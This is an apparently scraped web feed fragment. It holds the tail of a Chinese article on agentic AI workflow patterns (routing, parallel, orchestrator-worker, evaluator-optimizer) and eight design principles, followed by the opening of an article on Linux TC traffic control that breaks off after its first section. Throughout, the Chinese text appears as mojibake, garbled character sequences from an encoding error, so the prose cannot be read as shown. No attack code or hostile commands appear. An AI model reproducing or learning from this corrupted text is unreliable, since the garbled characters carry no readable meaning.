<li>å…ˆä»¥æŸä¸€ç§è¯­è¨€åˆ›ä½œè¥é”€å†…å®¹ï¼Œå†åœ¨ä¿ç•™å…¶è¯­è¨€ç²¾é«“çš„å‰æä¸‹å°†å…¶ç¿»è¯‘ä¸ºå¦ä¸€ç§è¯­è¨€ã€‚</li>
<li>æŒ‰ç»“æ„åŒ–æµç¨‹æ’°å†™æ–‡æ¡£ï¼šå…ˆç”Ÿæˆæ–‡æ¡£å¤§çº²ï¼Œæ ¸éªŒå¤§çº²çš„å®Œæ•´æ€§ï¼Œå†æ®æ­¤æ’°å†™å®Œæ•´æ–‡æœ¬ã€‚</li>
</ul>
<h3 data-id="heading-7">2ã€è·¯ç”±æ¨¡å¼</h3>
<p>è·¯ç”±æ¨¡å¼çš„æ ¸å¿ƒæ˜¯å¯¹è¾“å…¥å†…å®¹è¿›è¡Œåˆ†ç±»ï¼Œå¹¶å°†å…¶å¯¼å‘å¯¹åº”çš„ä¸“ç”¨æç¤ºè¯æˆ–å¤„ç†æµç¨‹ã€‚è¿™ç§æ–¹æ³•ç¡®ä¿ä¸åŒç±»å‹çš„æŸ¥è¯¢æˆ–ä»»åŠ¡è¢«åˆ†ç±»å¤„ç†ï¼Œä»è€Œæå‡å¤„ç†æ•ˆç‡ä¸å“åº”è´¨é‡ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f5f668643b5645608ec74ac9a9392cea~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRnJlZUNvZGU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768444812&amp;x-signature=kDK13HE4V0q5YFMy72Bo5QSJnDA%3D" alt="image.png" loading="lazy"/></p>
<p><strong>é€‚ç”¨åœºæ™¯</strong>ï¼š</p>
<p>é€‚ç”¨äºä¸åŒç±»å‹è¾“å…¥éœ€è¦å·®å¼‚åŒ–å¤„ç†ç­–ç•¥çš„åœºæ™¯ï¼Œå¯ç¡®ä¿å„ç±»ä»»åŠ¡çš„å¤„ç†æ€§èƒ½è¾¾åˆ°æœ€ä¼˜ã€‚</p>
<p><strong>åº”ç”¨ç¤ºä¾‹</strong>ï¼š</p>
<ul>
<li>å°†å®¢æˆ·æœåŠ¡å’¨è¯¢åˆ†ç±»è‡³ä¸åŒæ¿å—ï¼Œå¦‚æŠ€æœ¯æ”¯æŒã€é€€æ¬¾ç”³è¯·æˆ–é€šç”¨å’¨è¯¢ã€‚</li>
<li>ä¸ºæ§åˆ¶æˆæœ¬ï¼Œå°†ç®€å•æŸ¥è¯¢åˆ†é…ç»™è½»é‡çº§æ¨¡å‹å¤„ç†ï¼Œå¤æ‚è¯·æ±‚åˆ™äº¤ç”±å…ˆè¿›æ¨¡å‹è´Ÿè´£ã€‚</li>
</ul>
<h3 data-id="heading-8">3ã€å¹¶è¡Œæ¨¡å¼</h3>
<p>å¹¶è¡Œæ¨¡å¼å°†ä¸€é¡¹ä»»åŠ¡æ‹†è§£ä¸ºå¤šä¸ªå¯åŒæ­¥è¿è¡Œçš„ç‹¬ç«‹å­æµç¨‹ï¼Œä»¥æ­¤é™ä½ç³»ç»Ÿå»¶è¿Ÿã€æé«˜ååé‡ã€‚è¯¥æ¨¡å¼å¯åˆ†ä¸ºä¸¤ç±»ï¼šåˆ†æ®µæ‰§è¡Œï¼ˆé¢å‘ç›¸äº’ç‹¬ç«‹çš„å­ä»»åŠ¡ï¼‰ä¸æŠ•ç¥¨æœºåˆ¶ï¼ˆé€šè¿‡å¤šä»½è¾“å‡ºç»“æœæå‡å‡†ç¡®æ€§ï¼‰ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a81efc1b7a044c609e32c79110e05337~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRnJlZUNvZGU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768444812&amp;x-signature=5kl1t9ZOEAhJvMxRy8KpRhuBk7E%3D" alt="image.png" loading="lazy"/></p>
<p><strong>é€‚ç”¨åœºæ™¯</strong>ï¼š</p>
<p>é€‚ç”¨äºä»»åŠ¡å¯æ‹†è§£ä¸ºç‹¬ç«‹æ¨¡å—ä»¥æå‡å¤„ç†é€Ÿåº¦ï¼Œæˆ–éœ€è¦é€šè¿‡å¤šä»½è¾“å‡ºç»“æœå¢å¼ºç»“è®ºå¯ä¿¡åº¦çš„åœºæ™¯ã€‚</p>
<p><strong>åº”ç”¨ç¤ºä¾‹</strong>ï¼š</p>
<ul>
<li>åˆ†æ®µæ‰§è¡Œï¼šæ‹†åˆ†å†…å®¹å®¡æ ¸ç±»ä»»åŠ¡ï¼Œç”±ä¸€ä¸ªæ¨¡å‹è´Ÿè´£è¾“å…¥å†…å®¹ç­›æŸ¥ï¼ŒåŒæ—¶ç”±å¦ä¸€ä¸ªæ¨¡å‹åŒæ­¥ç”Ÿæˆåé¦ˆç»“æœã€‚</li>
<li>æŠ•ç¥¨æœºåˆ¶ï¼šéƒ¨ç½²å¤šä¸ªæ¨¡å‹äº¤å‰æ ¡éªŒä»£ç æ¼æ´ï¼Œæˆ–å¯¹å†…å®¹å®¡æ ¸ç»“è®ºè¿›è¡Œå¤šæ¨¡å‹ä¸€è‡´æ€§åˆ†æã€‚</li>
</ul>
<h3 data-id="heading-9">4ã€åè°ƒå™¨ - æ‰§è¡Œè€…æ¨¡å¼</h3>
<p>è¯¥è®¾è®¡æ¨¡å¼çš„æ ¸å¿ƒç‰¹å¾æ˜¯ä¸€ä¸ªä¸­å¤®åè°ƒå™¨æ¨¡å‹â€”â€” å®ƒå¯åŠ¨æ€å°†ä»»åŠ¡æ‹†è§£ä¸ºå­ä»»åŠ¡ï¼Œåˆ†é…ç»™ä¸“ä¸šåŒ–çš„æ‰§è¡Œè€…æ¨¡å‹ï¼Œå¹¶å¯¹æ‰§è¡Œç»“æœè¿›è¡Œæ±‡æ€»æ•´åˆã€‚ä¸å¹¶è¡Œå¤„ç†æ¨¡å¼ä¸åŒï¼Œè¯¥æ¨¡å¼èƒ½æ ¹æ®è¾“å…¥å†…å®¹çš„å¤æ‚ç¨‹åº¦è¿›è¡Œè‡ªé€‚åº”è°ƒæ•´ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/afaf54dc1cf64779b686be1664ef6ffb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRnJlZUNvZGU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768444812&amp;x-signature=JyQ2ldude9anX1LTLvf5lBcIRgI%3D" alt="image.png" loading="lazy"/></p>
<p><strong>é€‚ç”¨åœºæ™¯</strong>ï¼š</p>
<p>æœ€é€‚åˆéœ€è¦åŠ¨æ€ä»»åŠ¡åˆ†è§£ä¸å®æ—¶è‡ªé€‚åº”è°ƒæ•´ï¼Œä¸”å­ä»»åŠ¡æ— æ³•é¢„å…ˆå®šä¹‰çš„åœºæ™¯ã€‚</p>
<p><strong>åº”ç”¨ç¤ºä¾‹</strong>ï¼š</p>
<ul>
<li>æ ¹æ®éœ€æ±‚å˜æ›´çš„å…·ä½“å†…å®¹ï¼Œè‡ªåŠ¨ä¿®æ”¹ä»£ç åº“ä¸­çš„å¤šä¸ªæ–‡ä»¶ã€‚</li>
<li>ä»å¤šä¸ªä¿¡æ¯æºæ”¶é›†å¹¶æ•´åˆç›¸å…³æ•°æ®ï¼Œå¼€å±•å®æ—¶ç ”ç©¶å·¥ä½œã€‚</li>
</ul>
<h3 data-id="heading-10">5ã€è¯„ä¼°å™¨ - ä¼˜åŒ–å™¨æ¨¡å¼</h3>
<p>è¯„ä¼°å™¨ - ä¼˜åŒ–å™¨æ¨¡å¼çš„è¿è¡Œé€»è¾‘æ˜¯ï¼šå…ˆç”Ÿæˆåˆå§‹è¾“å‡ºå†…å®¹ï¼Œå†åŸºäºè¯„ä¼°æ¨¡å‹çš„åé¦ˆä¿¡æ¯å¯¹å…¶è¿›è¡Œè¿­ä»£ä¼˜åŒ–ï¼Œä»è€ŒæŒç»­æ”¹è¿›å†…å®¹è´¨é‡ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0edf7a8c10f34bf7b65ddc382f37252e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRnJlZUNvZGU=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768444812&amp;x-signature=xVHQ2P1jsvtVP73FH4Px5eIR6Es%3D" alt="image.png" loading="lazy"/></p>
<p><strong>é€‚ç”¨åœºæ™¯</strong>ï¼š</p>
<p>é€‚ç”¨äºé€šè¿‡è¿­ä»£ä¼˜åŒ–èƒ½æ˜¾è‘—æå‡å“åº”è´¨é‡çš„ä»»åŠ¡ï¼Œå°¤å…¶åœ¨å­˜åœ¨æ˜ç¡®è¯„ä¼°æ ‡å‡†çš„åœºæ™¯ä¸­æ•ˆæœçªå‡ºã€‚</p>
<p><strong>åº”ç”¨ç¤ºä¾‹</strong>ï¼š</p>
<ul>
<li>é€šè¿‡å¤šè½®è¯„ä¼°ä¸ä¼˜åŒ–å¾ªç¯ï¼Œå®Œå–„æ–‡å­¦æ–‡æœ¬çš„ç¿»è¯‘è´¨é‡ã€‚</li>
<li>æ‰§è¡Œå¤šè½®ç ”ç©¶æ£€ç´¢ä»»åŠ¡ï¼Œé€šè¿‡è¿­ä»£ä¼˜åŒ–æŒç»­ç²¾ç‚¼æœç´¢ç»“æœã€‚</li>
</ul>
<h2 data-id="heading-11">ä¸‰ã€Agentic AIç³»ç»Ÿæ ¸å¿ƒè®¾è®¡åŸåˆ™</h2>
<h3 data-id="heading-12">3.1 æ ¸å¿ƒè®¾è®¡åŸåˆ™</h3>
<p>Agentic AIç³»ç»Ÿè®¾è®¡åº”éµå¾ªä»¥ä¸‹å…«å¤§æ ¸å¿ƒåŸåˆ™ï¼š</p>
<h4 data-id="heading-13">1ã€è‡ªä¸»æ€§ä¸å¯æ§æ€§åŸåˆ™</h4>
<p>å¼€å‘è€…åº”æ ¹æ®å®é™…éœ€æ±‚å†³å®šæ˜¯è®©ç³»ç»Ÿè‡ªä¸»æ€§æ›´å¼ºä¸€äº›è¿˜æ˜¯å·¥ä½œæµç¨‹çš„å¯æ§æ€§æ›´å¼ºä¸€äº›ã€‚</p>
<h4 data-id="heading-14">2ã€æ¨¡å—åŒ–ä¸ç»„ä»¶åŒ–åŸåˆ™</h4>
<p>å°†æ™ºèƒ½ä½“ç³»ç»Ÿæ‹†è§£ä¸ºæ¾è€¦åˆã€å¯å¤ç”¨çš„åŠŸèƒ½æ¨¡å—ï¼Œå„æ¨¡å—ç‹¬ç«‹å°è£…èƒ½åŠ›ï¼Œä¾¿äºçµæ´»ç»„åˆã€å‡çº§ä¸ç»´æŠ¤ã€‚</p>
<h4 data-id="heading-15">3ã€åŠ¨æ€é€‚åº”æ€§åŸåˆ™</h4>
<p>ç³»ç»Ÿéœ€å…·å¤‡åº”å¯¹éç»“æ„åŒ–ã€å®æ—¶å˜åŒ–åœºæ™¯çš„èƒ½åŠ›ï¼Œèƒ½å¤Ÿå¤„ç†è®­ç»ƒæ•°æ®å¤–çš„æ–°é—®é¢˜ã€æ–°è¾“å…¥ï¼Œè§£å†³ä¼ ç»Ÿ LLMâ€œçŸ¥è¯†è¿‡æ—¶ã€è¯­å¢ƒè„±èŠ‚â€ çš„ç—›ç‚¹ã€‚</p>
<h4 data-id="heading-16">4ã€å·¥å…·å¢å¼ºåŸåˆ™</h4>
<p>é€šè¿‡é›†æˆå¤–éƒ¨å·¥å…·ã€çŸ¥è¯†åº“ä¸è®¡ç®—èµ„æºï¼Œçªç ´æ™ºèƒ½ä½“è‡ªèº«é¢„è®­ç»ƒçŸ¥è¯†çš„å±€é™ï¼Œæ‹“å±•ç³»ç»Ÿçš„åŠŸèƒ½è¾¹ç•Œä¸é¢†åŸŸé€‚é…èƒ½åŠ›ã€‚</p>
<h4 data-id="heading-17">5ã€åä½œæ€§åŸåˆ™</h4>
<p>å¯¹äºå¤æ‚åœºæ™¯å¤æ‚ä»»åŠ¡ä¸‹çš„Agentic AIï¼Œé‡‡ç”¨å¤šæ™ºèƒ½ä½“åˆ†å·¥åä½œï¼Œé€šè¿‡ä»»åŠ¡åˆ†é…ã€ä¿¡æ¯å…±äº«ä¸ç»“æœæ•´åˆï¼Œå¯ä»¥å–å¾—å•æ™ºèƒ½ä½“æ— æ³•è¾¾æˆçš„æ•ˆæœã€‚</p>
<h4 data-id="heading-18">6ã€è¿­ä»£ä¼˜åŒ–åŸåˆ™</h4>
<p>å†…ç½®åæ€ä¸åé¦ˆæœºåˆ¶ï¼Œé€šè¿‡ â€œæ‰§è¡Œ - è¯„ä¼° - ä¼˜åŒ–â€ çš„é—­ç¯æµç¨‹ï¼ŒæŒç»­æå‡ä»»åŠ¡æ‰§è¡Œçš„å‡†ç¡®æ€§ä¸æ•ˆç‡ã€‚</p>
<h4 data-id="heading-19">7ã€å¯è§£é‡Šæ€§åŸåˆ™</h4>
<p>æ™ºèƒ½ä½“çš„å†³ç­–è¿‡ç¨‹ä¸è¾“å‡ºç»“æœéœ€é€æ˜å¯è¿½æº¯ï¼Œä¾¿äºç”¨æˆ·ç†è§£ã€è°ƒè¯•ä¸ä¿¡ä»»ï¼Œå°¤å…¶é€‚ç”¨äºåŒ»ç–—ã€æ³•å¾‹ã€é‡‘èç­‰é«˜å±é¢†åŸŸã€‚</p>
<h4 data-id="heading-20">8ã€èµ„æºä¼˜åŒ–ä¸å¯æ‰©å±•æ€§åŸåˆ™</h4>
<p>åœ¨ä¿è¯ç³»ç»Ÿæ€§èƒ½çš„å‰æä¸‹ï¼Œåˆç†åˆ†é…è®¡ç®—èµ„æºï¼Œå¹¶æ”¯æŒéšç€ä»»åŠ¡è§„æ¨¡å¢é•¿å¹³æ»‘æ‰©å±•ï¼Œé¿å…èµ„æºæµªè´¹æˆ–ç³»ç»Ÿå´©æºƒã€‚</p>
<h3 data-id="heading-21">3.2 è®¾è®¡åŸåˆ™ä¹‹é—´çš„ååŒå…³ç³»</h3>
<p>Agentic AIç³»ç»Ÿçš„å…«å¤§æ ¸å¿ƒè®¾è®¡åŸåˆ™å¹¶éå­¤ç«‹å­˜åœ¨ï¼Œè€Œæ˜¯ç›¸äº’æ”¯æ’‘ã€ååŒä½œç”¨ï¼š</p>
<ul>
<li>è‡ªä¸»å¯æ§ + æ¨¡å—åŒ– æ˜¯ç³»ç»Ÿçš„æ ¸å¿ƒæ¶æ„åŸºç¡€ï¼›</li>
<li>åŠ¨æ€é€‚åº”æ€§ + å·¥å…·å¢å¼º æ‹“å±•ç³»ç»Ÿçš„èƒ½åŠ›è¾¹ç•Œï¼›</li>
<li>åä½œæ€§ + è¿­ä»£ä¼˜åŒ– æå‡å¤æ‚ä»»åŠ¡çš„å¤„ç†æ•ˆç‡ä¸è´¨é‡ï¼›</li>
<li>å¯è§£é‡Šæ€§ + èµ„æºä¼˜åŒ– ä¿éšœç³»ç»Ÿçš„å¯é æ€§ä¸å®ç”¨æ€§ã€‚</li>
</ul>
<h2 data-id="heading-22">å››ã€æ€»ç»“</h2>
<ul>
<li>
<p>æ™ºèƒ½ä½“å››å¤§åŸºç¡€è®¾è®¡æ¨¡å¼ï¼šåæ€ã€è§„åˆ’ã€å·¥å…·è°ƒç”¨ã€å¤šæ™ºèƒ½ä½“åä½œã€‚</p>
</li>
<li>
<p>å·¥ä½œæµäº”å¤§åŸºç¡€è®¾è®¡æ¨¡å¼ï¼šæç¤ºé“¾ã€è·¯ç”±ã€å¹¶è¡Œã€åè°ƒå™¨ - æ‰§è¡Œè€…ã€è¯„ä¼°å™¨ - ä¼˜åŒ–å™¨ã€‚</p>
</li>
<li>
<p>æ™ºèƒ½ä½“å’Œå·¥ä½œæµæ„æˆAgentic AIç³»ç»Ÿçš„åŸºç¡€ï¼Œé‚£ä¹ˆæ™ºèƒ½ä½“å’Œå·¥ä½œæµçš„è¿™ä¹ç§è®¾è®¡æ¨¡å¼åˆ™æ„æˆAgentic AIç³»ç»Ÿè®¾è®¡çš„åŸºç¡€ã€‚å¼€å‘è€…å¯ä»¥çµæ´»é€‰æ‹©å’Œç»„åˆå®ƒä»¬æ¥æ„å»ºç¬¦åˆå®é™…åœºæ™¯éœ€è¦çš„æ™ºèƒ½ä½“åŒ–AIç³»ç»Ÿã€‚</p>
</li>
<li>
<p>ç»å…¸çš„æ™ºèƒ½ä½“è®¾è®¡æ¨¡å¼ReActæ¨¡å¼ã€Plan and Executeæ¨¡å¼ã€ä»¥åŠå¤šæ™ºèƒ½ä½“çš„ä¸»ç®¡åˆ†æ´¾æ¨¡å¼ã€å¹³ç­‰äº¤æ¥æ¨¡å¼ï¼Œæœ¬è´¨ä¸Šéƒ½æ˜¯å¯¹è¿™äº›åŸºç¡€è®¾è®¡æ¨¡å¼çš„ç»„åˆè¿ç”¨ã€‚æ‰€ä¸åŒçš„åªæ˜¯åŸºç¡€æ¨¡å¼é’ˆå¯¹å•ä¸€ä»»åŠ¡å’ŒåŸºç¡€åœºæ™¯çš„å¤„ç†æ¨¡å¼æŠ½è±¡ï¼Œç»„åˆæ¨¡å¼æ˜¯é’ˆå¯¹å¤åˆä»»åŠ¡å’Œå¤æ‚åœºæ™¯çš„å¤„ç†æ¨¡å¼æŠ½è±¡ã€‚</p>
</li>
<li>
<p>Agentic AIç³»ç»Ÿè®¾è®¡åº”æ ¹æ®å®é™…éœ€æ±‚ï¼Œéµå¾ªå…«å¤§æ ¸å¿ƒè®¾è®¡åŸåˆ™ï¼Œçµæ´»é€‰æ‹©å’Œç»„åˆä½¿ç”¨åŸºç¡€è®¾è®¡æ¨¡å¼ã€‚</p>
</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Linuxæµé‡æ§åˆ¶ç¥å™¨TCå®Œå…¨æŒ‡å—ï¼šåŸç†è¯¦è§£ä¸å®è·µæŒ‡å—]]></title>    <link>https://juejin.cn/post/7592548677743935534</link>    <guid>https://juejin.cn/post/7592548677743935534</guid>    <pubDate>2026-01-08T02:31:08.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592548677743935534" data-draft-id="7592520539152875529" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Linuxæµé‡æ§åˆ¶ç¥å™¨TCå®Œå…¨æŒ‡å—ï¼šåŸç†è¯¦è§£ä¸å®è·µæŒ‡å—"/> <meta itemprop="keywords" content="Linux,å‘½ä»¤è¡Œ"/> <meta itemprop="datePublished" content="2026-01-08T02:31:08.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="AllFiles"/> <meta itemprop="url" content="https://juejin.cn/user/1927880364792937"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Linuxæµé‡æ§åˆ¶ç¥å™¨TCå®Œå…¨æŒ‡å—ï¼šåŸç†è¯¦è§£ä¸å®è·µæŒ‡å—
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1927880364792937/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    AllFiles
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T02:31:08.000Z" title="Thu Jan 08 2026 02:31:08 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»8åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>ç½‘ç»œæµé‡æ§åˆ¶ä»æœªå¦‚æ­¤æ¸…æ™°ï¼Œä»å†…æ ¸åŸç†åˆ°ç”Ÿäº§ç¯å¢ƒå®æˆ˜</p>
</blockquote>
<h2 data-id="heading-0">å¼•è¨€</h2>
<p>åœ¨æ—¥å¸¸å¼€å‘å’Œè¿ç»´ä¸­ï¼Œä½ æ˜¯å¦é‡åˆ°è¿‡è¿™äº›æƒ…å†µï¼Ÿ</p>
<ul>
<li>Gitæ‹‰å–ä»£ç æ—¶ï¼Œæ•´ä¸ªåŠå…¬å®¤ç½‘ç»œéƒ½è¢«æ‹–æ…¢</li>
<li>æ•°æ®åº“åŒæ­¥å æ»¡å¸¦å®½ï¼Œå½±å“çº¿ä¸ŠæœåŠ¡</li>
<li>éœ€è¦ä¸ºä¸åŒä¸šåŠ¡åˆ†é…ä¸åŒçš„ç½‘ç»œä¼˜å…ˆçº§</li>
<li>é˜²æ­¢æŸäº›IPåœ°å€æ»¥ç”¨ç½‘ç»œèµ„æº</li>
</ul>
<p>æ‰€æœ‰è¿™äº›é—®é¢˜çš„è§£å†³æ–¹æ¡ˆï¼Œéƒ½æŒ‡å‘Linuxå†…æ ¸ä¸­ä¸€ä¸ªå¼ºå¤§è€Œç¥ç§˜çš„å·¥å…·â€”â€”TCï¼ˆTraffic Controlï¼Œæµé‡æ§åˆ¶ï¼‰ã€‚æœ¬æ–‡å°†æ·±å…¥æµ…å‡ºåœ°è®²è§£TCçš„åŸç†ã€æ ¸å¿ƒæ¦‚å¿µï¼Œå¹¶é€šè¿‡å®é™…æ¡ˆä¾‹å±•ç¤ºå¦‚ä½•åº”ç”¨å®ƒè§£å†³å„ç§ç½‘ç»œæµé‡ç®¡ç†é—®é¢˜ã€‚</p>
<h2 data-id="heading-1">ä¸€ã€TCåŸç†ï¼šLinuxå†…æ ¸æµé‡æ§åˆ¶çš„æ ¸å¿ƒ</h2>
<h3 data-id="heading-2">1.1 TCåœ¨ç½‘ç»œæ ˆä¸­çš„ä½ç½®</h3>
<p>TCæ˜¯Linuxå†…æ ¸å®ç°æµé‡æ§åˆ¶çš„æ ¸å¿ƒæœºåˆ¶ã€‚è¦ç†è§£TCï¼Œé¦–å…ˆè¦æ˜ç™½å®ƒåœ¨ç½‘ç»œæ•°æ®åŒ…å¤„ç†æµç¨‹ä¸­çš„ä½ç½®ï¼š</p>
<pre><code class="hljs">æ¥æ”¶åŒ… â†’ æµé‡é™åˆ¶ â†’ è¾“å…¥å¤šè·¯åˆ†é…å™¨ â†’ æœ¬æœºå¤„ç† æˆ– è½¬å‘å¤„ç†
</code></pre>
<p>å…·ä½“æ¥è¯´ï¼š</p>
<ol>
<li>
<p><strong>æ¥æ”¶é˜¶æ®µ</strong>ï¼šæ•°æ®åŒ…ä»ç½‘ç»œæ¥å£è¿›å…¥ï¼ŒTCé¦–å…ˆè¿›è¡Œæµé‡é™åˆ¶ï¼Œä¸¢å¼ƒä¸ç¬¦åˆè§„å®šçš„åŒ…</p>
</li>
<li>
<p><strong>åˆ†å‘å†³ç­–</strong>ï¼šç»è¿‡è¾“å…¥å¤šè·¯åˆ†é…å™¨åˆ¤æ–­ï¼š</p>
<ul>
<li>ç›®çš„åœ°å€æ˜¯æœ¬æœº â†’ é€å¾€ä¸Šå±‚åè®®æ ˆï¼ˆTCP/UDPï¼‰</li>
<li>ç›®çš„åœ°å€æ˜¯å…¶ä»–ä¸»æœº â†’ è¿›å…¥è½¬å‘æµç¨‹</li>
</ul>
</li>
<li>
<p><strong>å‘é€æ§åˆ¶</strong>ï¼šè¿™æ˜¯TCå‘æŒ¥ä½œç”¨çš„ä¸»è¦ç¯èŠ‚ï¼Œå¯¹å‡ºç«™ï¼ˆegressï¼‰æµé‡è¿›è¡Œé˜Ÿåˆ—ç®¡ç†å’Œæ•´å½¢</p>
</li>
</ol>
